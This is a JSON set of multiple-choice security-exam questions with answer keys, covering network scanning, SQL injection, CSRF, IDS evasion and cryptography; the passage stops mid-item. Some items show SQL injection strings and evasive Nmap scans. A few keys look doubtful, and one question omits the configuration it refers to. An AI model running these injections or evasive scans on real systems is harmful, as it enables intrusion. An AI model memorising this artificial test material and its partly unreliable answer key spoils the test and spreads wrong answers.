[
  {
    "question": "What is a set of extensions to DNS that provide to DNS clients (resolvers) origin authentication, authenticated denial of existence and data integrity, but not availability or confidentiality?",
    "answer": "DNSSEC",
    "hint": null,
    "options": [
      "Zone transfer",
      "Resource transfer",
      "Resource records",
      "DNSSEC"
    ]
  },
  {
    "question": "Jack sent an email to Jenny with a business proposal. Jenny accepted it and fulfilled all her obligations. Jack suddenly refused his offer when everything was ready and said that he had never sent an email. Which of the following digital signature properties will help Jenny prove that Jack is lying?",
    "answer": "Non-Repudiation",
    "hint": null,
    "options": [
      "Integrity",
      "Non-Repudiation",
      "Authentication",
      "Confidentiality"
    ]
  },
  {
    "question": "Which of the following best describes a software firewall?",
    "answer": "Software firewall is placed between the normal application and the networking components of the operating system.",
    "hint": null,
    "options": [
      "Software firewall is placed between the anti-virus application and the IDS components of the operating system.",
      "Software firewall is placed between the desktop and the software components of the operating system.",
      "Software firewall is placed between the router and the networking components of the operating system.",
      "Software firewall is placed between the normal application and the networking components of the operating system."
    ]
  },
  {
    "question": "What are the two main conditions for a digital signature?",
    "answer": "Unforgeable and authentic.",
    "hint": null,
    "options": [
      "Unique and have special characters.",
      "It has to be the same number of characters as a physical signature and must be unique.",
      "Unforgeable and authentic.",
      "Legible and neat."
    ]
  },
  {
    "question": "Maria is surfing the internet and trying to find information about Super Security LLC. Which process is Maria doing?",
    "answer": "Footprinting",
    "hint": null,
    "options": [
      "Enumeration",
      "System Hacking",
      "Footprinting",
      "Scanning"
    ]
  },
  {
    "question": "Maria conducted a successful attack and gained access to a Linux server. She wants to avoid that NIDS will not catch the succeeding outgoing traffic from this server in the future. Which of the following is the best way to avoid detection of NIDS?",
    "answer": "Encryption.",
    "hint": null,
    "options": [
      "Encryption.",
      "Out of band signaling.",
      "Alternate Data Streams.",
      "Protocol Isolation."
    ]
  },
  {
    "question": "Ivan, a black hat hacker, sends partial HTTP requests to the target webserver to exhaust the target server’s maximum concurrent connection pool. He wants to ensure that all additional connection attempts are rejected. What type of attack does Ivan implement?",
    "answer": "Slowloris",
    "hint": null,
    "options": [
      "Fragmentation",
      "Slowloris",
      "Spoofed Session Flood",
      "HTTP GET/POST"
    ]
  },
  {
    "question": "Define Metasploit module used to perform arbitrary, one-off actions such as port scanning, denial of service, SQL injection and fuzzing?",
    "answer": "Auxiliary Module.",
    "hint": null,
    "options": [
      "Payload Module.",
      "NOPS Module.",
      "Exploit Module.",
      "Auxiliary Module."
    ]
  },
  {
    "question": "Which regulation defines security and privacy controls for all U.S. federal information systems except those related to national security?",
    "answer": "NIST-800-53",
    "hint": null,
    "options": [
      "PCI-DSS",
      "NIST-800-53",
      "EU Safe Harbor",
      "HIPAA"
    ]
  },
  {
    "question": "Ivan, a black hat hacker, tries to call numerous random numbers inside the company, claiming he is from the technical support service. It offers company employee services in exchange for confidential data or login credentials. What method of social engineering does Ivan use?",
    "answer": "Quid Pro Quo",
    "hint": null,
    "options": [
      "Reverse Social Engineering",
      "Tailgating",
      "Quid Pro Quo",
      "Elicitation"
    ]
  },
  {
    "question": "John performs black-box testing. It tries to pass IRC traffic over port 80/TCP from a compromised web-enabled host during the test. Traffic is blocked, but outbound HTTP traffic does not meet any obstacles. What type of firewall checks outbound traffic?",
    "answer": "Application",
    "hint": null,
    "options": [
      "Stateful",
      "Packet Filtering",
      "Circuit",
      "Application"
    ]
  },
  {
    "question": "Which layer 3 protocol allows for end-to-end encryption of the connection?",
    "answer": "IPsec",
    "hint": null,
    "options": [
      "SFTP",
      "IPsec",
      "SSL",
      "FTPS"
    ]
  },
  {
    "question": "John, a cybersecurity specialist, received a copy of the event logs from all firewalls, Intrusion Detection Systems (IDS) and proxy servers on a company's network. He tried to match all the registered events in all the logs, and he found that their sequence didn't match. What can cause such a problem?",
    "answer": "The network devices are not all synchronized.",
    "hint": null,
    "options": [
      "The security breach was a false positive.",
      "A proper chain of custody was not observed while collecting the logs.",
      "The network devices are not all synchronized.",
      "The attacker altered events from the logs."
    ]
  },
  {
    "question": "Which of the following command-line flags set a stealth scan for Nmap?",
    "answer": "-sS",
    "hint": null,
    "options": [
      "-sT",
      "-sU",
      "-sS",
      "-sM"
    ]
  },
  {
    "question": "The attacker posted a message and an image on the forum, in which he embedded a malicious link. When the victim clicks on this link, the victim's browser sends an authenticated request to a server. What type of attack did the attacker use?",
    "answer": "Cross-site request forgery",
    "hint": null,
    "options": [
      "Cross-site request forgery",
      "Cross-site scripting",
      "SQL injection",
      "Session hijacking"
    ]
  },
  {
    "question": "The Web development team is holding an urgent meeting, as they have received information from testers about a new vulnerability in their Web software. They make an urgent decision to reduce the likelihood of using the vulnerability. The team beside to modify the software requirements to disallow users from entering HTML as input into their Web application. Determine the type of vulnerability that the test team found?",
    "answer": "Cross-site scripting vulnerability.",
    "hint": null,
    "options": [
      "Cross-site scripting vulnerability.",
      "Cross-site Request Forgery vulnerability.",
      "SQL injection vulnerability.",
      "Website defacement vulnerability."
    ]
  },
  {
    "question": "You conduct an investigation and finds out that the browser of one of your employees sent malicious requests that the employee knew nothing about. Identify the web page vulnerability that the attacker used when the attack to your employee?",
    "answer": "Cross-Site Request Forgery (CSRF)",
    "hint": null,
    "options": [
      "File Inclusion Attack",
      "Cross-Site Request Forgery (CSRF)",
      "Command Injection Attacks",
      "Hidden Field Manipulation Attack"
    ]
  },
  {
    "question": "Identify the type of jailbreaking which allows user-level access and does not allow iboot-level access?",
    "answer": "Userland Exploit",
    "hint": null,
    "options": [
      "Userland Exploit",
      "Bootrom Exploit",
      "iBootrom Exploit",
      "iBoot Exploit"
    ]
  },
  {
    "question": "Determine the type of SQL injection: SELECT * FROM user WHERE name = 'x' AND userid IS NULL; --';",
    "answer": "End of Line Comment.",
    "hint": null,
    "options": [
      "UNION SQL Injection.",
      "End of Line Comment.",
      "Tautology.",
      "Illegal/Logically Incorrect Query."
    ]
  },
  {
    "question": "Which of the following SQL injection attack does an attacker usually bypassing user authentication and extract data by using a conditional OR clause so that the condition of the WHERE clause will always be true?",
    "answer": "Tautology",
    "hint": null,
    "options": [
      "UNION SQLi",
      "Error-Based SQLi",
      "End-of-Line Comment",
      "Tautology"
    ]
  },
  {
    "question": "Which of the following application security testing method of white-box testing, in which only the source code of applications and their components is scanned for determines potential vulnerabilities in their software and architecture?",
    "answer": "SAST",
    "hint": null,
    "options": [
      "IAST",
      "DAST",
      "SAST",
      "MAST"
    ]
  },
  {
    "question": "Which of the following is the method of determining the movement of a data packet from an untrusted external host to a protected internal host through a firewall?",
    "answer": "Firewalking",
    "hint": null,
    "options": [
      "MITM",
      "Firewalking",
      "Session hijacking",
      "Network sniffing"
    ]
  },
  {
    "question": "Often, for a successful attack, hackers very skillfully simulate phishing messages. To do this, they collect the maximum information about the company that they will attack: emails of real employees (including information about the hierarchy in the company), information about the appearance of the message (formatting, logos), etc. What is the name of this stage of the hacker's work?",
    "answer": "Reconnaissance stage",
    "hint": null,
    "options": [
      "Exploration stage",
      "Investigation stage",
      "Reconnaissance stage",
      "Enumeration stage"
    ]
  },
  {
    "question": "Imagine the following scenario: 1. An attacker created a website with tempting content and banner like: 'Do you want to make $10 000 in a month?'. 2. Victim clicks to the interesting and attractive content URL. 3. Attacker creates a transparent 'iframe' in front of the banner which victim attempts to click. Victim thinks that he/she clicks to the 'Do you want to make $10 000 in a month?' banner but actually he/she clicks to the content or URL that exists in the transparent 'iframe' which is set up by the attacker. What is the name of the attack which is described in the scenario?",
    "answer": "Clickjacking Attack",
    "hint": null,
    "options": [
      "Session Fixation",
      "Clickjacking Attack",
      "HTML Injection",
      "HTTP Parameter Pollution"
    ]
  },
  {
    "question": "Black hat hacker Ivan wants to implement a man-in-the-middle attack on the corporate network. For this, he connects his router to the network and redirects traffic to intercept packets. What can the administrator do to mitigate the attack?",
    "answer": "Add message authentication to the routing protocol.",
    "hint": null,
    "options": [
      "Use the Open Shortest Path First (OSPF).",
      "Add message authentication to the routing protocol.",
      "Use only static routes in the corporation's network.",
      "Redirection of the traffic is not possible without the explicit admin's confirmation."
    ]
  },
  {
    "question": "Which of the options presented below is not a Bluetooth attack?",
    "answer": "Bluedriving",
    "hint": null,
    "options": [
      "Bluesmacking",
      "Bluesnarfing",
      "Bluejacking",
      "Bluedriving"
    ]
  },
  {
    "question": "You analyze the logs and see the following output of logs from the machine with the IP address of 192.168.0.132: Time August 21 11:22:06 Port:20 Source:192.168.0.30 Destination:192.168.0.132 Protocol:TCP Time August 21 11:22:08 Port:21 Source:192.168.0.30 Destination:192.168.0.132 Protocol:TCP Time August 21 11:22:11 Port:22 Source:192.168.0.30 Destination:192.168.0.132 Protocol:TCP Time August 21 11:22:14 Port:23 Source:192.168.0.30 Destination:192.168.0.132 Protocol:TCP Time August 21 11:22:15 Port:25 Source:192.168.0.30 Destination:192.168.0.132 Protocol:TCP Time August 21 11:22:19 Port:80 Source:192.168.0.30 Destination:192.168.0.132 Protocol:TCP Time August 21 11:22:21 Port:443 Source:192.168.0.30 Destination:192.168.0.132 Protocol:TCP What conclusion can you make based on this output?",
    "answer": "Port scan targeting 192.168.0.132",
    "hint": null,
    "options": [
      "Denial of service attack targeting 192.168.0.132",
      "Port scan targeting 192.168.0.30",
      "Teardrop attack targeting 192.168.0.132",
      "Port scan targeting 192.168.0.132"
    ]
  },
  {
    "question": "With which of the following SQL injection attacks can an attacker deface a web page, modify or add data stored in a database and compromised data integrity?",
    "answer": "Compromised Data Integrity.",
    "hint": null,
    "options": [
      "Unauthorized access to an application.",
      "Compromised Data Integrity.",
      "Loss of data availability.",
      "Information Disclosure."
    ]
  },
  {
    "question": "The attacker enters its malicious data into intercepted messages in a TCP session since source routing is disabled. He tries to guess the responses of the client and server. What hijacking technique is described in this example?",
    "answer": "Blind",
    "hint": null,
    "options": [
      "RST",
      "TCP/IP",
      "Blind",
      "Registration"
    ]
  },
  {
    "question": "The attacker tries to take advantage of vulnerability where the application does not verify if the user is authorized to access the internal object via its name or key. Which of the following queries best describes an attempt to exploit an insecure direct object using the name of the valid account 'User 1'?",
    "answer": "\"GET/restricted/accounts/?name=User1 HTTP/1.1 Host: westbank.com\"",
    "hint": null,
    "options": [
      "\"GET/restricted/bank.getaccount('˜User1') HTTP/1.1 Host: westbank.com\"",
      "\"GET/restricted/goldtransfer?to=Account&from=1 or 1=1' HTTP/1.1 Host: westbank.com\"",
      "\"GET/restricted/\r\n%00account%00User1%00access HTTP/1.1 Host: westbank.com\"",
      "\"GET/restricted/accounts/?name=User1 HTTP/1.1 Host: westbank.com\""
    ]
  },
  {
    "question": "What actions should be performed before using a Vulnerability Scanner for scanning a network?",
    "answer": "Checking if the remote host is alive.",
    "hint": null,
    "options": [
      "TCP/IP stack fingerprinting.",
      "Checking if the remote host is alive.",
      "TCP/UDP Port scanning.",
      "Firewall detection."
    ]
  },
  {
    "question": "Which of the following is the risk that remains after the amount of risk left over after natural or inherent risks have been reduced?",
    "answer": "Residual risk",
    "hint": null,
    "options": [
      "Residual risk",
      "Impact risk",
      "Inherent risk",
      "Deferred risk"
    ]
  },
  {
    "question": "Which of the following incident handling process phases is responsible for defining rules, employees training, creating a back-up, and preparing software and hardware resources before an incident occurs?",
    "answer": "Preparation",
    "hint": null,
    "options": [
      "Recovery",
      "Containment",
      "Identification",
      "Preparation"
    ]
  },
  {
    "question": "Wireshark is one of the most important tools for a cybersecurity specialist. It is used for network troubleshooting, analysis, software, etc. And you often have to work with a packet bytes pane. In what format is the data presented in this pane?",
    "answer": "Hexadecimal",
    "hint": null,
    "options": [
      "ASCII only",
      "Hexadecimal",
      "Binary",
      "Decimal"
    ]
  },
  {
    "question": "Alex, a cyber security specialist, should conduct a pentest inside the network, while he received absolutely no information about the attacked network. What type of testing will Alex conduct?",
    "answer": "Internal, Black-box.",
    "hint": null,
    "options": [
      "Internal, Black-box.",
      "External, Black-box.",
      "Internal, Grey-box.",
      "Internal, White-box."
    ]
  },
  {
    "question": "Victor, a white hacker, received an order to perform a penetration test from the company \"Test us\". He starts collecting information and finds the email of an employee of this company in free access. Victor decides to send a letter to this email, changing the original email address to the email of the boss of this employee, \"boss@testus.com\". He asks the employee to immediately open the \"link with the report\" and check it. An employee of the company \"Test us\" opens this link and infects his computer. Thanks to these manipulations, Viktor gained access to the corporate network and successfully conducted a pentest. What type of attack did Victor use?",
    "answer": "Social engineering",
    "hint": null,
    "options": [
      "Eavesdropping",
      "Piggybacking",
      "Social engineering",
      "Tailgating"
    ]
  },
  {
    "question": "Which of the following Nmap's commands allows you to most reduce the probability of detection by IDS when scanning common ports?",
    "answer": "nmap -sT -O -T0",
    "hint": null,
    "options": [
      "nmap -sT -O -T0",
      "nmap -A --host-timeout 99-T1",
      "nmap -sT -O -T2",
      "nmap -A – Pn"
    ]
  },
  {
    "question": "Which of the following is a network software suite designed for 802.11 WEP and WPA-PSK keys cracking that can recover keys once enough data packets have been captured?",
    "answer": "Aircrack-ng",
    "hint": null,
    "options": [
      "Aircrack-ng",
      "WLAN-crack",
      "Airguard",
      "Wificracker"
    ]
  },
  {
    "question": "Which of the following best describes code injection?",
    "answer": "Form of attack in which a malicious user inserts text into a data field interpreted as code.",
    "hint": null,
    "options": [
      "Form of attack in which a malicious user gains access to the codebase on the server and inserts new code.",
      "Form of attack in which a malicious user inserts additional code into the JavaScript running in the browser.",
      "Form of attack in which a malicious user gets the server to execute arbitrary code using a buffer overflow.",
      "Form of attack in which a malicious user inserts text into a data field interpreted as code."
    ]
  },
  {
    "question": "John, a pentester, received an order to conduct an internal audit in the company. One of its tasks is to search for open ports on servers. Which of the following methods is the best solution for this task?",
    "answer": "Scan servers with Nmap.",
    "hint": null,
    "options": [
      "Scan servers with Nmap.",
      "Scan servers with MBSA.",
      "Manual scan on each server.",
      "Telnet to every port on each server."
    ]
  },
  {
    "question": "Alex, the penetration tester, performs a server scan. To do this, he uses the method where the TCP Header is split into many packets so that it becomes difficult to determine what packages are used for. Determine the scanning technique that Alex uses?",
    "answer": "IP Fragmentation Scan",
    "hint": null,
    "options": [
      "ACK flag scanning",
      "TCP Scanning",
      "IP Fragmentation Scan",
      "Inverse TCP flag scanning"
    ]
  },
  {
    "question": "Which of the following is an encryption technique where data is encrypted by a sequence of photons that have a spinning trait while traveling from one end to another?",
    "answer": "Quantum Cryptography",
    "hint": null,
    "options": [
      "Hardware-Based.",
      "Quantum Cryptography.",
      "Homomorphic.",
      "Elliptic Curve Cryptography."
    ]
  },
  {
    "question": "Identify the standard by the description: A regulation contains a set of guidelines that everyone who processes any electronic data in medicine should adhere to. It includes information on medical practices, ensuring that all necessary measures are in place while saving, accessing, and sharing any electronic medical data to secure patient data.",
    "answer": "HIPAA",
    "hint": null,
    "options": [
      "COBIT",
      "ISO/IEC 27002",
      "HIPAA",
      "FISMA"
    ]
  },
  {
    "question": "You make a series of interactive queries, choosing subsequent plaintexts based on the information from the previous encryptions. What type of attack are you trying to perform?",
    "answer": "Adaptive chosen-plaintext attack",
    "hint": null,
    "options": [
      "Chosen-plaintext attack",
      "Ciphertext-only attack",
      "Known-plaintext attack",
      "Adaptive chosen-plaintext attack"
    ]
  },
  {
    "question": "Which of the following options represents a conceptual characteristic of an anomaly-based IDS over a signature-based IDS?",
    "answer": "Can identify unknown attacks.",
    "hint": null,
    "options": [
      "Can identify unknown attacks.",
      "Produces less false positives.",
      "Cannot deal with encrypted network traffic.",
      "Requires vendor updates for a new threat."
    ]
  },
  {
    "question": "Which of the following is a protocol that used for querying databases that store the registered users or assignees of an Internet resource, such as a domain name, an IP address block or an autonomous system?",
    "answer": "WHOIS",
    "hint": null,
    "options": [
      "CAPTCHA",
      "Internet Engineering Task Force",
      "Internet Assigned Numbers Authority",
      "WHOIS"
    ]
  },
  {
    "question": "Elon plans to make it difficult for the packet filter to determine the purpose of the packet when scanning. Which of the following scanning techniques will Elon use?",
    "answer": "SYN/FIN scanning using IP fragments.",
    "hint": null,
    "options": [
      "ACK scanning.",
      "IPID scanning.",
      "ICMP scanning.",
      "SYN/FIN scanning using IP fragments."
    ]
  },
  {
    "question": "Which of the following will allow you to prevent unauthorized network access to local area networks and other information assets by wireless devices?",
    "answer": "WIPS",
    "hint": null,
    "options": [
      "HIDS",
      "AISS",
      "WIPS",
      "NIDS"
    ]
  },
  {
    "question": "Identify Secure Hashing Algorithm, which produces a 160-bit digest from a message on principles similar to those used in MD4 and MD5?",
    "answer": "SHA-1",
    "hint": null,
    "options": [
      "SHA-2",
      "SHA-1",
      "SHA-0",
      "SHA-3"
    ]
  },
  {
    "question": "Ivan, the black hat hacker, split the attack traffic into many packets such that no single packet triggers the IDS. Which IDS evasion technique does Ivan use?",
    "answer": "Session Splicing.",
    "hint": null,
    "options": [
      "Unicode Evasion.",
      "Session Splicing.",
      "Low-bandwidth attacks.",
      "Flooding."
    ]
  },
  {
    "question": "Which of the following tools is packet sniffer, network detector and IDS for 802.11(a, b, g, n) wireless LANs?",
    "answer": "Kismet",
    "hint": null,
    "options": [
      "Abel",
      "Nessus",
      "Nmap",
      "Kismet"
    ]
  },
  {
    "question": "What is the purpose of the demilitarized zone?",
    "answer": "To add an extra layer of security to an organization's local area network.",
    "hint": null,
    "options": [
      "To add a protect to network devices.",
      "To scan all traffic coming through the DMZ to the internal network.",
      "To provide a place for a honeypot.",
      "To add an extra layer of security to an organization's local area network."
    ]
  },
  {
    "question": "You managed to compromise a server with an IP address of 10.10.0.5, and you want to get fast a list of all the machines in this network. Which of the following Nmap command will you need?",
    "answer": "nmap -T4 -F 10.10.0.0/24",
    "hint": null,
    "options": [
      "nmap -T4 -F 10.10.0.0/24",
      "nmap -T4 -r 10.10.1.0/24",
      "nmap -T4 -q 10.10.0.0/24",
      "nmap -T4 -p 10.10.0.0/24"
    ]
  },
  {
    "question": "Attacker uses various IDS evasion techniques to bypass intrusion detection mechanisms. At the same time, IDS is configured to detect possible violations of the security policy, including unauthorized access and misuse. Which of the following evasion method depend on the Time-to-Live (TTL) fields of a TCP/IP ?",
    "answer": "Insertion Attack",
    "hint": null,
    "options": [
      "Obfuscation",
      "Unicode Evasion",
      "Denial-of-Service Attack",
      "Insertion Attack"
    ]
  },
  {
    "question": "alert tcp any any -> 10.199.10.3 21 (msg: \"FTP on the network!\");",
    "answer": "IDS",
    "hint": null,
    "options": [
      "Firewall IPTable",
      "Router IPTable",
      "FTP Server rule",
      "IDS"
    ]
  },
  {
    "question": "What is a \"Collision attack\"?",
    "answer": "Сollision attack on a hash tries to find two inputs producing the same hash value.",
    "hint": null,
    "options": [
      "Сollision attack on a hash tries to find two inputs producing the same hash value.",
      "Collision attacks break the hash into several parts, with the same bytes in each part to get the private key.",
      "Collision attacks attempt to recover information from a hash.",
      "Collision attacks try to change the hash."
    ]
  },
  {
    "question": "Determine the attack by the description: The known-plaintext attack used against DES. This attack causes that encrypting plaintext with one DES key followed by encrypting it with a second DES key is no more secure than using a single key.",
    "answer": "Meet-in-the-middle attack",
    "hint": null,
    "options": [
      "Traffic analysis attack",
      "Meet-in-the-middle attack",
      "Man-in-the-middle attack",
      "Replay attack"
    ]
  },
  {
    "question": "Identify a vulnerability in OpenSSL that allows stealing the information protected under normal conditions by the SSL/TLS encryption used to secure the Internet?",
    "answer": "Heartbleed Bug",
    "hint": null,
    "options": [
      "SSL/TLS Renegotiation Vulnerability",
      "Heartbleed Bug",
      "Shellshock",
      "POODLE"
    ]
  },
  {
    "question": "The evil hacker Antonio is trying to attack the IoT device. He will use several fake identities to create a strong illusion of traffic congestion, affecting communication between neighbouring nodes and networks. What kind of attack does Antonio perform?",
    "answer": "Sybil Attack",
    "hint": null,
    "options": [
      "Side-Channel Attack",
      "Forged Malicious Device",
      "Sybil Attack",
      "Exploit Kits"
    ]
  },
  {
    "question": "John, a penetration tester, decided to conduct SQL injection testing. He enters a huge amount of random data and observes changes in output and security loopholes in web applications. What SQL injection testing technique did John use?",
    "answer": "Fuzzing Testing",
    "hint": null,
    "options": [
      "Dynamic Testing.",
      "Static Testing.",
      "Function Testing.",
      "Fuzzing Testing."
    ]
  },
  {
    "question": "Which of the following Nmap options will you use if you want to scan fewer ports than the default?",
    "answer": "-F",
    "hint": null,
    "options": [
      "-p",
      "-T",
      "-sP",
      "-F"
    ]
  },
  {
    "question": "Rajesh, a network administrator found several unknown files in the root directory of his FTP server. He was very interested in a binary file named \"mfs\". Rajesh decided to check the FTP server logs and found that the anonymous user account logged in to the server, uploaded the files and ran the script using a function provided by the FTP server's software. Also, he found that \"mfs\" file is running as a process and it listening to a network port. What kind of vulnerability must exist to make this attack possible?",
    "answer": "File system permissions.",
    "hint": null,
    "options": [
      "File system permissions.",
      "Privilege escalation.",
      "Brute force login.",
      "Directory traversal."
    ]
  },
  {
    "question": "Michael works as a system administrator. He receives a message that several sites are no longer available. Michael tried to go to the sites by URL, but it didn't work. Then he tried to ping the sites and enter IP addresses in the browser - it worked. What problem could Michael identify?",
    "answer": "Traffic is Blocked on UDP Port 53",
    "hint": null,
    "options": [
      "Traffic is Blocked on UDP Port 69",
      "Traffic is Blocked on UDP Port 53",
      "Traffic is Blocked on UDP Port 88",
      "Traffic is Blocked on UDP Port 56"
    ]
  },
  {
    "question": "Ivan, an evil hacker, conducts an SQLi attack that is based on True/False questions. What type of SQLi does Ivan use?",
    "answer": "Blind SQLi",
    "hint": null,
    "options": [
      "Blind SQLi",
      "Classic SQLi",
      "DMS-specific SQLi",
      "Compound SQLi"
    ]
  },
  {
    "question": "Which of the following web application attack inject the special character elements \"Carriage Return\" and \"Line Feed\" into the user’s input to trick the web server, web application, or user into believing that the current object is terminated and a new object has been initiated?",
    "answer": "CRLF Injection.",
    "hint": null,
    "options": [
      "CRLF Injection.",
      "HTML Injection.",
      "Log Injection.",
      "Server-Side JS Injection."
    ]
  },
  {
    "question": "John, a system administrator, is learning how to work with new technology: Docker. He will use it to create a network connection between the container interfaces and its parent host interface. Which of the following network drivers is suitable for John?",
    "answer": "Macvlan networking.",
    "hint": null,
    "options": [
      "Bridge networking.",
      "Macvlan networking.",
      "Host networking.",
      "Overlay networking."
    ]
  },
  {
    "question": "Mark, the network administrator, must allow UDP traffic on the host 10.0.0.3 and Internet traffic in the host 10.0.0.2. In addition to the main task, he needs to allow all FTP traffic to the rest of the network and deny all other traffic. Mark applies his ACL configuration on the router, and everyone has a problem with accessing FTP. In addition, hosts that are allowed access to the Internet cannot connect to it. In accordance with the following configuration, determine what happened on the network?",
    "answer": "The first ACL is denying all TCP traffic, and the router is ignoring the other ACLs.",
    "hint": null,
    "options": [
      "The ACL for FTP must be before the ACL 110.",
      "The ACL 104 needs to be first because is UDP.",
      "The ACL 110 needs to be changed to port 80.",
      "The first ACL is denying all TCP traffic, and the router is ignoring the other ACLs."
    ]
  },
  {
    "question": "Which of the following can be designated as \"Wireshark for CLI\"?",
    "answer": "tcpdump",
    "hint": null,
    "options": [
      "nessus",
      "tcpdump",
      "ethereal",
      "John the Ripper"
    ]
  },
  {
    "question": "What is an automated software testing technique that involves providing invalid, unexpected, or random data as inputs to a computer program?",
    "answer": "Fuzz testing",
    "hint": null,
    "options": [
      "Concolic testing",
      "Fuzz testing",
      "Security testing",
      "Monkey testing"
    ]
  },
  {
    "question": "Which one of the following Google search operators allows restricting results to those from a specific website?",
    "answer": "[site:]",
    "hint": null,
    "options": [
      "[link:]",
      "[inurl:]",
      "[site:]",
      "[cache:]"
    ]
  },
  {
    "question": "Based on the following data, you need to calculate the approximate cost of recovery of the system operation per year: The cost of a new hard drive is $300; The chance of a hard drive failure is 1/3; The recovery specialist earns $10/hour; Restore the OS and software to the new hard disk - 10 hours; Restore the database from the last backup to the new hard disk - 4 hours; Assume the EF = 1 (100%), calculate the SLE, ARO, and ALE.",
    "answer": "$146",
    "hint": null,
    "options": [
      "$146",
      "$440",
      "$960",
      "$295"
    ]
  },
  {
    "question": "John needs to choose a firewall that can protect against SQL injection attacks. Which of the following types of firewalls is suitable for this task?",
    "answer": "Web application firewall.",
    "hint": null,
    "options": [
      "Hardware firewall.",
      "Packet firewall.",
      "Stateful firewall.",
      "Web application firewall."
    ]
  },
  {
    "question": "Which of the following is the type of violation when an unauthorized individual enters a building following an employee through the employee entrance?",
    "answer": "Tailgating.",
    "hint": null,
    "options": [
      "Tailgating.",
      "Pretexting.",
      "Announced.",
      "Reverse Social Engineering."
    ]
  },
  {
    "question": "Which of the following program attack both the boot sector and executable files?",
    "answer": "Multipartite Virus",
    "hint": null,
    "options": [
      "Polymorphic virus",
      "Multipartite Virus",
      "Macro virus",
      "Stealth virus"
    ]
  },
  {
    "question": "The company \"Usual company\" asked a cybersecurity specialist to check their perimeter email gateway security. To do this, the specialist creates a specially formatted email message: From: employee76@usualcompany.com To: employee34@usualcompany.com Subject: Test message Date: 5/8/2021 11:22 He sends this message over the Internet, and a \"Usual company \" employee receives it. This means that the gateway of this company doesn't prevent _____.",
    "answer": "Email Spoofing",
    "hint": null,
    "options": [
      "Email Harvesting",
      "Email Masquerading",
      "Email Spoofing",
      "Email Phishing"
    ]
  },
  {
    "question": "Rajesh, the system administrator analyzed the IDS logs and noticed that when accessing the external router from the administrator's computer to update the router configuration, IDS registered alerts. What type of an alert is this?",
    "answer": "False positive",
    "hint": null,
    "options": [
      "False negative",
      "True positive",
      "True negative",
      "False positive"
    ]
  },
  {
    "question": "For the company, an important criterion is the immutability of the financial reports sent by the financial director to the accountant. They need to be sure that the accountant received the reports and it hasn't been changed. How can this be achieved?",
    "answer": "Use a hash algorithm in the document once CFO approved the financial statements.",
    "hint": null,
    "options": [
      "Use a hash algorithm in the document once CFO approved the financial statements.",
      "Reports can send to the accountant using an exclusive USB for that document.",
      "Use a protected excel file.",
      "Financial reports can send the financial statements twice, one by email and the other delivered in USB and the accountant can compare both."
    ]
  },
  {
    "question": "While using your bank's online servicing you notice the following string in the URL bar: http://www.MyPersonalBank.com/account?id=368940911028389&Damount=10980&Camount=21You observe that if you modify the Damount & Camount values and submit the request, that data on the web page reflect the changes. Which type of vulnerability is present on this site?",
    "answer": "Web Parameter Tampering",
    "hint": null,
    "options": [
      "Web Parameter Tampering",
      "Cookie Tampering",
      "SQL injection",
      "XSS Reflection"
    ]
  },
  {
    "question": "Ferdinand installs a virtual communication tower between the two authentic endpoints to mislead the victim. What attack does Ferdinand perform?",
    "answer": "aLTEr",
    "hint": null,
    "options": [
      "Aspidistra",
      "Wi-Jacking",
      "Sinkhole",
      "aLTEr"
    ]
  },
  {
    "question": "Which of the following best describes the \"white box testing\" methodology?",
    "answer": "The internal operation of a system is completely known to the tester.",
    "hint": null,
    "options": [
      "The internal operation of a system is completely known to the tester.",
      "Only the external operation of a system is accessible to the tester.",
      "Only the internal operation of a system is known to the tester.",
      "The internal operation of a system is only partly accessible to the tester."
    ]
  },
  {
    "question": "Why is a penetration test considered to be better than a vulnerability scan?",
    "answer": "Penetration tests are intended to exploit weaknesses in the architecture of your IT network, while a vulnerability scan does not typically involve active exploitation.",
    "hint": null,
    "options": [
      "The tools used by penetration testers tend to have much more comprehensive vulnerability databases.",
      "Penetration tests are intended to exploit weaknesses in the architecture of your IT network, while a vulnerability scan does not typically involve active exploitation.",
      "A penetration test is often performed by an automated tool, while a vulnerability scan requires active engagement.",
      "Vulnerability scans only do host discovery and port scanning by default."
    ]
  },
  {
    "question": "Alex, a cybersecurity specialist, received a task from the head to scan open ports. One of the main conditions was to use the most reliable type of TCP scanning. Which of the following types of scanning should Alex use?",
    "answer": "TCP Connect/Full Open Scan.",
    "hint": null,
    "options": [
      "Half-open Scan.",
      "TCP Connect/Full Open Scan.",
      "Xmas Scan.",
      "NULL Scan."
    ]
  },
  {
    "question": "What best describes two-factor authentication for a credit card (using a card and pin)?",
    "answer": "Something you have and something you know.",
    "hint": null,
    "options": [
      "Something you have and something you know.",
      "Something you have and something you are.",
      "Something you know and something you are.",
      "Something you are and something you remember."
    ]
  },
  {
    "question": "What means the flag \"-oX\" in a Nmap scan?",
    "answer": "Output the results in XML format to a file.",
    "hint": null,
    "options": [
      "Output the results in truncated format to the screen.",
      "Run a Xmas scan.",
      "Output the results in XML format to a file.",
      "Run an express scan."
    ]
  },
  {
    "question": "Which of the following characteristics is not true about the Simple Object Access Protocol?",
    "answer": "Only compatible with the application protocol HTTP.",
    "hint": null,
    "options": [
      "Only compatible with the application protocol HTTP.",
      "Allows for any programming model.",
      "Exchanges data between web services.",
      "Using Extensible Markup Language."
    ]
  },
  {
    "question": "Which of the following wireless standard has bandwidth up to 54 Mbit/s and signals in a regulated frequency spectrum around 5 GHz?",
    "answer": "802.11a",
    "hint": null,
    "options": [
      "802.11g",
      "802.11i",
      "802.11n",
      "802.11a"
    ]
  },
  {
    "question": "Which of the following cipher is based on factoring the product of two large prime numbers?",
    "answer": "RSA",
    "hint": null,
    "options": [
      "SHA-1",
      "RSA",
      "MD5",
      "RC5"
    ]
  },
  {
    "question": "Which of the following command will help you launch the Computer Management Console from\" Run \" windows as a local administrator Windows 7?",
    "answer": "compmgmt.msc",
    "hint": null,
    "options": [
      "gpedit.msc",
      "ncpa.cpl",
      "compmgmt.msc",
      "services.msc"
    ]
  },
  {
    "question": "Which of the following does not apply to IPsec?",
    "answer": "Work at the Data Link Layer",
    "hint": null,
    "options": [
      "Work at the Data Link Layer",
      "Encrypts the payloads",
      "Provides authentication.",
      "Use key exchange."
    ]
  },
  {
    "question": "According to the Payment Card Industry Data Security Standard, when is it necessary to conduct external and internal penetration testing?",
    "answer": "At least once a year and after any significant upgrade or modification.",
    "hint": null,
    "options": [
      "At least once a year and after any significant upgrade or modification.",
      "At least twice a year or after any significant upgrade or modification.",
      "At least once every three years or after any significant upgrade or modification.",
      "At least once every two years and after any significant upgrade or modification."
    ]
  },
  {
    "question": "What identifies malware by collecting data from protected computers while analyzing it on the provider’s infrastructure instead of locally?",
